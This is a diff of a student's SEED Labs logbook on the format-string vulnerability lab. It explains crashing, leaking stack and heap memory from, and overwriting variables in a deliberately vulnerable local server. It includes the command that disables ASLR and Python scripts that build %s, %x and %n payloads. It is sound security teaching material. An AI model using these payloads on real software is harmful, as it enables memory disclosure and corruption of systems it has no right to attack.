@@ -1,96 +1,67 @@
-<!--
-Notes:
-format strings parecido com buffer overflow
-menos tecnico que buffer overflow
-
-ctf relativamente simples
--->
 # Seed labs guide (Format-String vulnerability Lab)
 
-<!--from the guide:
-Some programs allow users to provide the entire or part of the
-contents in a format string. If such contents are not sanitized, malicious users can use this opportunity to get
-the program to run arbitrary code. A problem like this is called format string vulnerability.
---
-$ sudo sysctl -w kernel.randomize_va_space=0
->
-<!--
-argumentos na stack
-f {
-printf("%d", n);
-}
-stack:
-stack frame de f
-%d
-n
+## What is it?
+From the introduction, we understood what a format string vulnerability is and how it can happen. It happens when the user provides a string that is not sanitized, and the program uses it as a format string. This allows the user to crash the program, print its memory contents, modify them and even inject code. In this logbook, we cover only the first three.
 
-printf("%d %d", n)
-vai ler cenas arbitrárias da stack
-%d %d %d ... ler qqer cena da stack
+## Environment setup and understanding the program
+As specified in the guide, we turned off the countermeasure of address space randomization to simplify the tasks, by doing:
+```bash
+sudo sysctl -w kernel.randomize_va_space=0
+```
+### Analysis of the program
+In the server-code folder, we explored the program and its vulnerability.
 
-printf("%d", n)
-string "%d"
-n
-address to the string (in the stack)
+As expected, it has a format-string vulnerability, since it reads input given by the user and uses it as a format string. This is the critical lines, where "msg" comes directly from user input:
+```c
+// This line has a format-string vulnerability
+printf(msg);
+```
 
-e.g.
-f(4, 5)
-stack:
-5
-4  <- f points to here
+In order to compile this code, we ran "make" and to copy the binary into the containers, we ran "make install". In compilation, there is a compilation warning, which signals the format-string vulnerability of the program.
 
 
-printf("%d")
+### Container setup
+We ran the following commands to setup the containers:
+```bash
+docker-compose build
+docker-compose up
+```
+We'll only be using the container 10.9.0.5 in this logbook (tasks 1 to 3.B), since it is 32 bits.
+## Task 1: Crashing the program
+First, we tested the connection and the output of the server by sending a simply message. We used a new terminal window and ran:
+```bash
+echo 'Hello World' | nc 10.9.0.5 9090'
+```
+We also needed to do CTRL+C at the end because the program reads 1500 characters from stdin and we only provided a few.
 
-stack:
-string (e.g "%d")
-&string
+![Alt text](screenshots/w7/normal_input_fs.png)
 
+The result in the server was this.
 
-printf("ABCD%d")
+![Alt text](screenshots/w7/normal_server_result.png)
 
-stack:
-ABCD%d      %x  -> dá o ABCD (primeiros 4 bytes da string e depois vai imprimir os propios valores de %d)
-&string     %x
+From now on, as suggested in the guide, we used the python script provided to generate the badfile, which we would then send to the server using:
+```bash
+cat badfile | nc 10.9.0.5 9090
+```
+We tested making badfile be filled with 1500 "%x", but it did not crash the program, although it did print its memory contents.
+After this, we tested with 1500 "%s" and that crashed it, as shown here:
 
+![Alt text](screenshots/w7/first_crash.png)
 
-"0xABCD%d" (ABCD como bytes)
-ao imprimir %d vai aparacer igual (ABCD)
+At the start, we were not fully sure why. However, we now understand it crashes because "%s" expects an address as an argument. There are no arguments, so it reads an invalid address and tries to read from it, which causes the program to crash. Using "%x" will not crash, since this simply reads an argument in hexadecimal. Here, with no arguments, it just reads from the stack.
 
-Quantos percentagens precisas de ter para chegar à tua string
-ataque:
-%x%x...%s
--->
-<!--
-compiling the program with make -> we can see some compilation warnings related to format strings
--->
+## Task 2: Printing out the server program's memory
+### Task 2.A: Stack Data
+The objective of this task is to print the data on the stack, specifically determining the number of "%x" needed to print the first four bytes of our input.
 
-<!--
-crashed with python3 -c 'print("%s" * 1500) > file.txt
-cat file.txt | nc 10.9.0.5 9090
-did not print anything
--->
+Firstly, we tried doing it with a small number of "%x" and then increasing it until we got the first four bytes of our input.
+```python
+s = "ABCD" + "%x" * 10
+```
+This did not print our values, so we increased it.
+We ended up succeeding with 100 "%x". In fact, we were able to identify the first four bytes of our input "ABCD" by "44434241", which is ABCD backwards in hexadecimal (little-endian). Afterwards, we reduced the number to find the exact amount needed, and we ended up with the following.
 
-<!--
-target 0x11223344
-
-secret message 0x080b4008
-
--->
-
-
-
-<!--
-python3 -c 'print("ABCD " + "%.8x " * 64)' > badfile
-para chegar ao 44434241 (ABCD em little-endian) precisamos de 64 %x
--->
-<!--
-@
-1122334410008049db580e532080e61c0ffffd800ffffd72880e62d480e5000ffffd7c88049f7effffd8000648049f4780e53205dc5dcffffd800ffffd80080e9720000000000000000000000000018de4c0080e500080e5000ffffdde88049effffffd8005dc5dc80e5320000ffffdeb40005dcA secret message
-
--->
-
-%s finds the address `0x080b4008` and prints the string at that address. Normally, this would be an argument passed to the function, but here we can exploit this passing it in the string.
 ```python
 #!/usr/bin/python3
 import sys
@@ -99,73 +70,126 @@ import sys
 N = 1500
 content = bytearray(0x0 for i in range(N))
 
-# This line shows how to store a 4-byte integer at offset 0
-number  = 0x080b4008
-content[0:4] = (number).to_bytes(4,byteorder='little')
+s = "ABCD" + "%x" * 64
+fmt  = (s).encode('latin-1')
+content[0:len(fmt)] = fmt
 
-# This line shows how to construct a string s with
-#   12 of "%.8x", concatenated with a "%n"
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+To run, we just do:
+
+```bash
+python3 build_string.py # generate badfile
+cat badfile | nc 10.9.0.5 9090  # send badfile to the server
+```
+Note that this is a generic way to run the script and will be used for the other tasks as well.
+
+And the server output was this:
+
+![Alt text](screenshots/w7/server_task2a.png)
+
+Note the sequence "44434241" in the output, which is the hexadecimal representation of "ABCD" in little-endian.
+
+### Task 2.B: Heap Data
+The objective of this task is to print the value of the variable "secret_message", which is stored on the heap of the program. We already know the address of the variable from the server print-outs. It is 0x080b4008.
+
+
+We need to read the secret_message string, which is at address 0x080b4008. We can do this by using "%s" and passing the address as an argument. This is done by passing the address in the stack, as shown below.
+
+We can put the address of the variable at the beginning of our file (in binary), and then use "%s" to read it.
+
+We already know how many "%x" are needed to get to the beginning of our input, so we use that amount to get there and then use "%s" to read the content of the variable situated at that address (secret_message).
+
+
+```python
+#!/usr/bin/python3
+import sys
+
+# Initialize the content array
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+address  = 0x080b4008
+content[0:4] = (address).to_bytes(4,byteorder='little')
+
 s = "%x" * 63 + "%s"
 
 # The line shows how to store the string s at offset 8
 fmt  = (s).encode('latin-1')
 content[4:4 + len(fmt)] = fmt
 
-# This line shows how to store a 4-byte string at offset 4
-# content[4:8]  =  ("abcd").encode('latin-1')
-
-
 # Write the content to badfile
 with open('badfile', 'wb') as f:
   f.write(content)
 ```
+As explained, %s finds the address `0x080b4008` and prints the string at that address. Normally, this would be an argument passed to the function, but here we control the format string and can exploit this by passing the address in the string.
 
-<!--
-Objective: change the target's variable value.
-The address is 0x080e5068, in comparison to secret_message's address 0x080b4008
+The result in the server is as follows:
 
--->
+![Alt text](screenshots/w7/task_2b.png)
+
+As it is shown, we have successfully read the secret_message.
 
 
-Here, instead of reading the string at the address given, we will be changing the value at the address given. Before, we read the values in the address, now we change that value to be the number of bytes read so far.
-A normal use of this would be
+## Task 3
+The objective is to change the value of the target variable, which is stored in the heap.
+
+So, instead of reading the string at the address given, we will be changing the value at the address given.
+The way to do this with a format string is to use "%n". This changes the value of the variable in the address given to be the number of bytes printed so far.
+
+A normal/safe use of this would be:
 ```c
+int charCount;
 printf("Hello, world!%n\n", &charCount);
 ```
-Here, there is no argument passed. In fact, the argument that is effectively seen by printf is the address that we give it. This address for 3.A is the target's variable address, so we are effectively changing its value.
+
+### Task 3.A
+In this subtask, the goal is to change the content of the variable target.The address of that variable is 0x080e5068, as already seen in the printouts of the server.
+
+
+From task 2, we know how to pass the address of a variable to a format specifier that requires an address.
+So we can simply change the address to be the target's address and use "%n" at the end of the 63 "%x" to change its value.
+
 ```python
 #!/usr/bin/python3
 import sys
 
-# Initialize the content array
 N = 1500
 content = bytearray(0x0 for i in range(N))
 
-# This line shows how to store a 4-byte integer at offset 0
-number  = 0x080e5068
-content[0:4] = (number).to_bytes(4,byteorder='little')
+address  = 0x080e5068
+content[0:4] = (address).to_bytes(4,byteorder='little')
 
 s = "%x" * 63 + "%n"
 
-# The line shows how to store the string s at offset 4
 fmt  = (s).encode('latin-1')
 content[4:4 + len(fmt)] = fmt
-
-# This line shows how to store a 4-byte string at offset 4
-# content[4:8]  =  ("abcd").encode('latin-1')
 
 
 # Write the content to badfile
 with open('badfile', 'wb') as f:
   f.write(content)
-
 ```
 
-After the execution of `myprintf`, the value of the variable is no longer 11223344, and is now 0x000000ec, which is 236 in decimal, the number of bytes read so far.
+The result in the server is the following:
 
-To modify it to be 0x5000, which is 20480 in decimal, we need to read 20480 bytes before the %n.
+![Alt text](screenshots/w7/server_task3a.png)
 
-In the example below, we'll be reading 8 characters for each of the %x we have. Before the 0s were not printed and no empty space. Now the empty space is printed, effectively printing 8 characters for each of the hexadecimal prints. 63 * 8 = 504, and the value of the target variable is 0x1fc, which is 508 in decimal. This is because of the first four bytes read in binary corresponding to the address of the target variable (0x080e5068), as shown below.
+After the execution of `myprintf`, the value of the variable is no longer 0x11223344, and is now 0x000000ec, which is 236 in decimal, the number of bytes printed so far.
+
+
+
+### Task 3.B
+In this task, we want to modify the content of target to be a specific value, 0x5000.
+
+To use the same strategy as in task 3.a, we would have to print 0x5000 bytes before the "%n", which is 20480 in decimal. We cannot just add a lot of %x, because it only reads 1500 characters.
+
+So, we need to find a way to print more characters. We can do this by using the "%x" specifier with a number before the "x". This number specifies the minimum number of characters to be printed.
+
+In the example below, we'll be reading 8 characters for each of the %x we have.
 
 ```python
 number  = 0x080e5068
@@ -173,18 +197,29 @@ content[0:4] = (number).to_bytes(4,byteorder='little')
 
 s = "%8x" * 63 + "%n"
 ```
+The server result:
+![Alt text](screenshots/w7/task_3b_8x.png)
 
-So, now we just need to make a %x have more characters printed (these will be empty spaces, but it counts towards counting bytes written, for the "%n"). We need 20480 bytes and have 508, so we just need to add 20480 - 508 = 19972 empty spaces to the string. 
+Before, no empty spaces were printed. Now it is effectively printing 8 characters for each of the hexadecimal prints. 63 * 8 = 504, and the value of the target variable is 0x1fc, which is 508 in decimal. This is because of the first four bytes printed corresponding to the address of the target variable (0x080e5068).
+
+
+
+Now, we just need to make one of the %x have more characters printed (these will be empty spaces, but it counts towards bytes printed, for the "%n"). We need 20480 bytes and have 508, so we just need to add 20480 - 508 = 19972 empty spaces. 
 So, on the last %x, instead of just printing 8 characters, we'll print 19980 characters.
-See the string s below.
-<!--
-The last %x is changed to %19980x, and the number of %x is changed to 62, so that we have 62 * 8 + 19980 = 20480 characters printed, which is the number of bytes we need to write to the target variable.
--->
+
 ```python
 number  = 0x080e5068
 content[0:4] = (number).to_bytes(4,byteorder='little')
 
 s = "%8x" * 62 + "%19980x" + "%n"
 ```
+Now, the characters printed when getting to the "%n" will be 4 + 62 * 8 + 19980 = 20480, which is the number of bytes we need to write to the target variable.
+<!--
+The last %x is changed to %19980x, and the number of %x is changed to 62, so that we have 4 + 62 * 8 + 19980 = 20480 characters printed, which is the number of bytes we need to write to the target variable.
+-->
+Concluding, the output in the server is the following:
 
-As expected, a lot of empty spaces were printed in the server output and, in the end, we could see that the target variable's value was changed to 0x5000.
+![Alt text](screenshots/w7/task_3b_server.png)
+
+As expected, a lot of empty spaces were printed in the server output and, in the end, we could see that the target variable's value was sucessfully changed to 0x5000.
+
